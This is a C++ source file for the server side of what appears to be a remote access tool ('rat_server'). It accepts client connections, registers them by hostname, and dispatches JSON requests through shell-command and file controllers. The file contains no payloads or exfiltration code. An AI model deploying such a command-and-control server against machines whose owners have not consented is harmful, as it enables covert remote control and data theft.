#include "ServerManager.hpp"
#include "ServerCommandController.hpp"
#include "ServerLogController.hpp"
#include "ServerPingController.hpp"
#include "ServerFileController.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <sstream>
#include <fstream>

namespace Server {

// ============================================================================
// Singleton
// ============================================================================

std::shared_ptr<ServerManager> ServerManager::getInstance() {
    if (!ServerManager::instance) {
        std::lock_guard<std::mutex> lock(ServerManager::initMutex);
        if (!ServerManager::instance) ServerManager::instance.reset(new ServerManager());
    }
    return ServerManager::instance;
}

ServerManager::ServerManager() {
    // Initialize client management
    clientManagement_ = std::make_unique<ClientManagement>(this);
}

ServerManager::~ServerManager() {
    stop();
    
    std::lock_guard<std::mutex> lock(mtx_);
    cleanupResources();
}

// ============================================================================
// Lifecycle
// ============================================================================

bool ServerManager::start(unsigned short port) {
    unsigned short localPort = 0;
    
    {
        std::lock_guard<std::mutex> lock(mtx_);
        
        if (running_) {
            std::cerr << "Error: Server is already running" << std::endl;
            return false;
        }
        
        // Initialize listener socket
        listener_ = std::make_unique<Utils::TCPSocket>();
        if (!listener_->bind(port)) {
            std::cerr << "Failed to bind listener socket to port " << port << std::endl;
            std::cerr << "Possible causes:" << std::endl;
            std::cerr << "  - Port already in use (check with: lsof -i :" << port << ")" << std::endl;
            std::cerr << "  - Socket in TIME_WAIT state (wait ~60s or run: sudo fuser -k " << port << "/tcp)" << std::endl;
            std::cerr << "  - Insufficient permissions (ports < 1024 need root)" << std::endl;
            std::cerr << "  - Firewall blocking the port" << std::endl;
            listener_.reset();
            return false;
        }
        
        port_ = port;
        localPort = port;
        running_ = true;
        std::cout << "Server started successfully on port " << port << std::endl;
    }
    
    // Initialize system controllers AFTER releasing mutex to avoid deadlock
    initializeControllers(localPort);
    
    return true;
}


void ServerManager::stop() {
    std::lock_guard<std::mutex> lock(mtx_);
    
    if (!running_) return;
    
    running_ = false;
    
    // Close listener socket
    if (listener_) {
        listener_->close();
        listener_.reset();
    }
    
    port_ = 0;
}

bool ServerManager::isRunning() const {
    
    std::lock_guard<std::mutex> lock(mtx_);
    return running_;
}

int ServerManager::run(unsigned short port) {
    if (!start(port)) {
        return 1;
    }
    
    int unknownCount = 0;
    Utils::TCPSocket* listenerPtr = nullptr;
    
    {
        std::lock_guard<std::mutex> lock(mtx_);
        listenerPtr = listener_.get();
    }
    
    // Main server loop: accept and handle client connections
    while (isRunning()) {
        if (!listenerPtr) break;
        
        auto client = listenerPtr->accept();
        if (!client) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        
        handleNewClientConnection(std::move(client), unknownCount);
    }
    
    return 0;
}

// ============================================================================
// Client Management
// ============================================================================

bool ServerManager::addClient(const std::string &deviceName, std::unique_ptr<Utils::TCPSocket> socket) {
    return clientManagement_ ? clientManagement_->addClient(deviceName, std::move(socket)) : false;
}

bool ServerManager::removeClient(const std::string &deviceName) {
    return clientManagement_ ? clientManagement_->removeClient(deviceName) : false;
}

Utils::TCPSocket *ServerManager::getClient(const std::string &deviceName) {
    return clientManagement_ ? clientManagement_->getClient(deviceName) : nullptr;
}

// ============================================================================
// Controller Access
// ============================================================================

IController *ServerManager::getSystemController(const std::string &handle) {
    std::lock_guard<std::mutex> lock(mtx_);
    auto it = controllers_.find(handle);
    return (it != controllers_.end()) ? it->second.get() : nullptr;
}

// ============================================================================
// Communication
// ============================================================================

bool ServerManager::sendRequest(const std::string& clientName, const nlohmann::json& request) {
    if (!clientManagement_) return false;
    
    auto* client = clientManagement_->getClient(clientName);
    if (!client) return false;
    
    std::string jsonStr = request.dump();
    
    // Log outgoing request
    pushLog("→ " + clientName + ": " + jsonStr);
    
    return client->send(jsonStr);
}

bool ServerManager::receiveResponse(const std::string& clientName, nlohmann::json& response, int timeoutMs) {
    (void)timeoutMs; // Unused for now
    
    if (!clientManagement_) return false;
    
    auto* client = clientManagement_->getClient(clientName);
    if (!client) return false;
    
    std::string jsonStr;
    if (client->receive(jsonStr)) {
        try {
            response = nlohmann::json::parse(jsonStr);
            
            // Log incoming response
            pushLog("← " + clientName + ": " + jsonStr);
            
            return true;
        } catch (const std::exception& e) {
            std::cerr << "Failed to parse response: " << e.what() << std::endl;
        }
    }
    return false;
}

// ============================================================================
// Logging
// ============================================================================

void ServerManager::pushLog(const std::string &msg) {
    std::lock_guard<std::mutex> lock(logMtx_);
    logs_.push(msg);
    
    if (logPath_.empty()) logPath_ = "/tmp/rat_server.log";
    try {
        std::ofstream ofs(logPath_, std::ios::app);
        if (ofs) ofs << msg << std::endl;
    } catch (...) {}
}

bool ServerManager::popLog(std::string &out) {
    std::lock_guard<std::mutex> lock(logMtx_);
    if (logs_.empty()) return false;
    out = std::move(logs_.front());
    logs_.pop();
    return true;
}

// ============================================================================
// Client Info
// ============================================================================

std::vector<std::string> ServerManager::listClients() {
    return clientManagement_ ? clientManagement_->listClients() : std::vector<std::string>();
}

std::string ServerManager::getClientIP(const std::string &name) {
    return clientManagement_ ? clientManagement_->getClientIP(name) : "unknown";
}

bool ServerManager::hasClient(const std::string &name) {
    return clientManagement_ ? clientManagement_->hasClient(name) : false;
}

// ============================================================================
// Helper Functions (Private)
// ============================================================================

void ServerManager::initializeControllers(unsigned short port) {
    // Note: This function must be called WITHOUT holding mtx_ to avoid deadlock
    
    // Create and start log controller
    controllers_.emplace("log", std::make_unique<ServerLogController>(this));
    if (auto it = controllers_.find("log"); it != controllers_.end()) {
        it->second->start();
    }
    
    // Create and start bash/command controller
    controllers_.emplace("bash", std::make_unique<ServerCommandController>(this));
    if (auto it = controllers_.find("bash"); it != controllers_.end()) {
        it->second->start();
    }
    
    // Create and start file controller
    controllers_.emplace("file", std::make_unique<ServerFileController>(this));
    if (auto it = controllers_.find("file"); it != controllers_.end()) {
        it->second->start();
    }
    
    // Create and start ping controller (UDP discovery)
    auto pingController = std::make_unique<ServerPingController>(this);
    if (pingController->startUdpResponder(port)) {
        controllers_.emplace("ping", std::move(pingController));
    } else {
        std::cerr << "Warning: Failed to start UDP ping responder" << std::endl;
    }
}

void ServerManager::cleanupResources() {
    // Stop all controllers
    for (auto &[name, controller] : controllers_) {
        if (controller) {
            controller->stop();
        }
    }
    controllers_.clear();
    
    // Cleanup all client connections
    if (clientManagement_) {
        clientManagement_->cleanup();
    }
}

void ServerManager::handleNewClientConnection(std::unique_ptr<Utils::TCPSocket> client, int& unknownCount) {
    if (!client) return;
    
    // Set blocking mode for handshake
    client->setBlocking(true);
    
    // Receive and parse handshake message
    std::string deviceName;
    std::string jsonStr;
    
    if (client->receive(jsonStr)) {
        try {
            nlohmann::json initMsg = nlohmann::json::parse(jsonStr);
            if (initMsg.contains("hostname") && initMsg["hostname"].is_string()) {
                deviceName = initMsg["hostname"].get<std::string>();
            }
        } catch (const std::exception& e) {
            std::cerr << "Handshake parse error: " << e.what() << std::endl;
            pushLog("Failed to parse handshake from " + client->getRemoteAddress());
        }
    } else {
        std::cerr << "Failed to receive handshake from " << client->getRemoteAddress() << std::endl;
        return;
    }
    
    // Generate device name if not provided
    if (deviceName.empty()) {
        deviceName = "unknown" + std::to_string(++unknownCount);
    }
    
    // Ensure device name is unique
    int counter = unknownCount;
    if (clientManagement_) {
        deviceName = clientManagement_->generateUniqueDeviceName(deviceName, counter);
        unknownCount = counter;
    }
    
    // Register client
    if (clientManagement_) {
        if (clientManagement_->addClient(deviceName, std::move(client))) {
            std::cout << "Client registered: " << deviceName << std::endl;
        } else {
            std::cerr << "Failed to register client: " << deviceName << std::endl;
        }
    }
}


} 
